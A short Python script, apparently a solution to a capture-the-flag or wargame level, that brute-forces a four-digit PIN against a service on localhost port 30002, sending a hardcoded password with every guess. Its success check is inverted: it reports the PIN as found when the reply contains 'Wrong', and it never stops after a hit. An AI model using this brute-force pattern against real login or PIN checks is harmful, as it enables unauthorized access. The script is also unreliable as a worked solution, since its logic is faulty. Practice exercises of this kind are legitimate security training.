import socket

password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
with socket.socket() as s:
	s.connect(("127.0.0.1", 30002))
	print(s.recv(1024))

	for i in range(10000):
		s.sendall(bytes(password + " " + str(i).zfill(4) + "\n", encoding="UTF-8"))
		if str(s.recv(1024)).__contains__("Wrong"):
			print("pincode is " + str(i))